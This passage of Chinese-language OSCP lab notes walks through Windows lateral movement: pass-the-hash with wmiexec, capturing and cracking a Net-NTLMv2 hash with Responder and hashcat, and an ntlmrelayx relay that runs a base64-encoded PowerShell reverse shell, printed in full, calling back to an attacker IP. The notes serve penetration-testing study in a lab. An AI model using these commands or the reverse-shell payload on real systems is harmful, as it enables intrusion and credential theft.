>在 psexec 命令的最後，我們可以指定一個額外的參數，用來決定 psexec 在目標系統上執行的命令。\
>如果我們不指定這個參數(如上)，默認情況下會執行 `cmd.exe`，這樣會啟動目標系統上的命令提示，並提供一個交互式的界面。
>其他參數: `powershell.exe`, `explorer.exe`

以上以 SYSTEM 身份成功取得互動式 shell

#### 4. Obtain shell as the user we used for authentication
以上都是以 SYSTEM 身份而不是我們用於驗證身份的 user 接收 shell。\
可以使用 impacket 中的 wmiexec.py 腳本，來取得用於身份驗證的使用者 shell
```        
┌──(chw㉿CHW)-[~]
└─$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.111.212
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
VM2\administrator
```

### Cracking Net-NTLMv2
如果在 windows 上以 unprivileged user 取得 code execution 或 shell，代表我們不能使用 Mimikatz 等工具來提取密碼或 NTLM hash。\
那我們可以嘗試 [Net-NTLMv2](#Working-with-Password-Hashes) network authentication protocol 

範例目標: 透過 Net-NTLMv2 從 Windows 11 用戶端存取 Windows 2022 Server 上的 SMB share
> 雖然 [Kerberos](https://en.wikipedia.org/wiki/Kerberos_(protocol)) protocol 較安全，但現今大多數的 Windows environments 還是以 Net-NTLMv2 為主。

[Responder](https://github.com/lgandx/Responder) tool 主要用於攔截 NTLM 認證流量並擷取 Net-NTLMv2 Hash。內建 SMB server，可處理身份驗證過程並列印所有抓取的 Net-NTLMv2 Hash。\
Responder 也支援其他協議 (例如 HTTP、FTP) 以及 [Link-Local Multicast Name Resolution](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution)(LLMNR)、[NetBIOS Name Service](https://en.wikipedia.org/wiki/NetBIOS)(NBT-NS)、[Multicast_DNS](https://en.wikipedia.org/wiki/Multicast_DNS)(MDNS) 等名稱解析攻擊，這類攻擊在 MITRE ATT&CK 架構中被歸類為 [T1557](https://attack.mitre.org/techniques/T1557/001/)。

#### 1. 連接 Bind Shell，確認 user 權限
範例假設： 我們在 Kali 上將 Responder 設定為 SMB Server，並使用 VM11（位於 192.168.111.211）作為目標\
且 Window 已執行了一個 Bind Shell 監聽 4444 port
>[!Note]
> **Bind Shell vs. Reverse Shell**\
> Reverse Shell 比 Bind Shell 更常用，因為企業內網通常有防火牆

方式 | 目標機器 | 攻擊者行為 | 連線方式 |
:------:|:---------------------|:---------------------|:---------------------|
Bind Shell | 目標機器開一個監聽端口（如 4444）| 攻擊者直接連線 `nc <IP> 4444` | 目標機器被動等待
Reverse Shell | 目標機器主動連回攻擊者（如 8888）| 攻擊者監聽 `nc -lvp 8888` | 目標機器主動發送

```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.111.211 4444
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
VM01\paul

C:\Windows\system32>net user paul
net user paul
User name                    paul
Full Name                    paul power
Comment                      
User's comment               
Country/region code          000 (System Default)
...

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/15/2025 6:03:49 AM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users                
Global Group memberships     *None                 
The command completed successfully.

```
> 使用者是 `VM01\paul`\
> 確認 paul 的權限: Remote Desktop Users *Users
>> 不是 local administrator > 不能執行 Mimikatz (上面方法無效)

#### 2. 建立 Responder SMB server，讓目標回傳驗證
因此透過 Kali上 Responder 內建的 SMB server， 再以 user paul 的身份連接到 Responder 破解身份驗證過程中使用的 Net-NTLMv2 雜湊。
```
┌──(chw㉿CHW)-[~]
└─$ sudo apt update
sudo apt install responder -y
┌──(chw㉿CHW)-[~]
└─$ ip a 
...
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.45.225/24 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::5:3781:23d8:7961/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
            
┌──(chw㉿CHW)-[~]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    ...
    
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.225]
    Responder IPv6             [fe80::5:3781:23d8:7961]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-7004QFW84VE]
    Responder Domain Name      [GQH5.LOCAL]
    Responder DCE-RPC Port     [49724]

[+] Listening for events...                  
```
> 1. 查看 interface
> 2. 在對應 interface 執行responder，`-I`:設定監聽接口

#### 3. 接收 Net-NTLMv2 Hash 進行爆破
接著使用 paul 的 bind shell 存取剛剛建立的 Responder SMB 伺服器**不存在**的 SMB share。
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.111.211 4444
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir \\192.168.45.225\chw41      
dir \\192.168.45.225\chw41
Access is denied.
```
(Responder tab): 接收到 paul的 Net-NTLMv2 Hash 驗證
```
[+] Listening for events...                        

[SMB] NTLMv2-SSP Client   : 192.168.111.211
[SMB] NTLMv2-SSP Username : VM01\paul
[SMB] NTLMv2-SSP Hash     : paul::VM01:e3c92a6bbe6ed8c8:39296C8175A54130C27F9202B7245048:01010000000000008072E0608D7FDB01C69859215550C7C70000000002000800470051004800350001001E00570049004E002D003700300030003400510046005700380034005600450004003400570049004E002D00370030003000340051004600570038003400560045002E0047005100480035002E004C004F00430041004C000300140047005100480035002E004C004F00430041004C000500140047005100480035002E004C004F00430041004C00070008008072E0608D7FDB0106000400020000000800300030000000000000000000000000200000A8E932A27C367609FAA7B737747C9AC8F71288A00702213E4175617603B18BC30A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320035000000000000000000 
```
將 Net-NTLMv2 Hash 存成 paul.hash 進行爆破

```
┌──(chw㉿CHW)-[~]
└─$ cat paul.hash 
paul::VM01:e3c92a6bbe6ed8c8:39296C8175A54130C27F9202B7245048:01010000000000008072E0608D7FDB01C69859215550C7C70000000002000800470051004800350001001E00570049004E002D003700300030003400510046005700380034005600450004003400570049004E002D00370030003000340051004600570038003400560045002E...                                                             
┌──(chw㉿CHW)-[~]
└─$ hashcat --help | grep -i "ntlm"
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```
> mode 5600 ("NetNTLMv2")

Hashcat 爆破
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

...

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU
...
 
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: PAUL::VM01:e3c92a6bbe6ed8c8:39296c8175a54130c27f9202b7245048:01010000000000008072e0608d7fdb01c69859215550c7c70000000002000800470051004800350001001e00570049004e002d003700300030003400510046005700380034005600450004003400570049004e002d00370030003000340051004600570038003400560045002e0047005100480035002e004c004f00430041004c000300140047005100480035002e004c004f00430041004c000500140047005100480035002e004c004f00430041004c00070008008072e0608d7fdb0106000400020000000800300030000000000000000000000000200000a8e932a27c367609faa7b737747c9ac8f71288a00702213e4175617603b18bc30a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320035000000000000000000:123Password123
...
```
> 123Password123

#### 4.取得爆破密碼，登入 RDP 驗證
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:paul /p:123Password123 /v:192.168.111.211
```
![image](https://hackmd.io/_uploads/rJ5Uqm0Y1x.png)

### Relaying Net-NTLMv2
假設我們擁有 VM01 的低權限帳號 `files02admin`， 但無法直接使用 Mimikatz 來提取密碼。因此嘗試轉發 Net-NTLMv2 雜湊（Relay Attack）來攻擊 VM02 <[如上述攻擊](#Cracking-Net-NTLMv2)>。\
當透過 Responder 或 SMB 攻擊獲得了 `files02admin` 的 Net-NTLMv2 雜湊，但**擦湊太複雜無法破解**\
從帳號名稱 files02admin 來看，猜測帳號可能是 VM02 的本機管理員，因此我們可以嘗試 [Relay Attack](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068)，將這個 Net-NTLMv2 Hash 轉送到VM02 ，看看是否能成功登入。


使用 impacket-[ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) ，可以建立 SMB Server，並自動將 Net-NTLMv2 Hash 請求轉送到我們指定的目標機器（VM02）。
- VM01: 192.168.116.211
- VM02: 192.168.116.212 (目標機器)


#### 1. ntlmrelayx 建立 SMB Server, 並轉發身份驗證
在 ntlmrelayx 建立一個 SMB 伺服器，準備接收來自 `files02admin` 的身份驗證，並嘗試將這個身份轉發到 VM02。
```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.187.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```
> `--no-http-server`：禁用 HTTP Server，現在只想進行 SMB 轉發攻擊。\
`-smb2support`：啟用 SMB2 support，確保我們可以與現代 Windows 版本溝通。\
`-t`：設定目標 IP。
`-c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AI..."`：執行 base64 encode 的 PowerShell Reverse Shell。

>[!Important]
> PowerShell Reverse Shell 來自先前介紹過的 [PowerShell reverse shell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)\
> 以下能夠在 Powershell 直接轉 Base64 encode：
> ```
> PS /Users/CWei> $command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.185",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
>PS /Users/CWei> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
>PS /Users/CWei> $encodedCommand = [Convert]::ToBase64String($bytes)
>PS /Users/CWei> Write-Output $encodedCommand
>JABjAGwAaQBlAG4AdAAgAD0AIABOA...
>```

![image](https://github.com/user-attachments/assets/9a134acb-5c53-4b08-bfca-160046126c87)

#### 2. 開啟 nc 監聽，等待目標機器的 Reverse Shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
｜
```
#### 3. 連接 VM1 bind shell，進入 Powershel 連接 SMB
```
┌──(chw㉿CHW)-[~]
└─$ nc 192.168.187.211 5555
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
VM01\files02admin

C:\Windows\system32>dir \\192.168.45.185\chw
dir \\192.168.45.185\chw

```
(ntlmrelayx)
```
┌──(chw㉿CHW)-[~/Desktop/Offsec]
└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.187.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

Impacket v0.12.0.dev1 - Copyright 2023 Fortra
...

[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.187.211, attacking target smb://192.168.187.212
[*] Authenticating against smb://192.168.187.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] SMBD-Thread-8 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] SMBD-Thread-9 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] SMBD-Thread-10 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] SMBD-Thread-11 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] SMBD-Thread-12 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] SMBD-Thread-13 (process_request_thread): Connection from 192.168.187.211 controlled, but there are no more targets left!
[*] Executed specified command on host: 192.168.187.212
...
```
> ntlmrelayx tab 接收到來自 VM01 的連線

#### 4. nc 監聽 port 取得 Reverse Shell
(nc 8080): 接收到 Reverse Shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.187.212] 62793

PS C:\Windows\system32> hostname
VM02
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7187:d9ec:721d:14c2%4
   IPv4 Address. . . . . . . . . . . : 192.168.187.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.187.254
```
> 成功用 files02admin 取得 VM2 控制權限

### Windows Credential Guard
>[!Caution]
> HackMD 筆記長度限制，接續 [[OSCP, PEN-200] Instructional notes - Part 3](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 7"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%207.md)
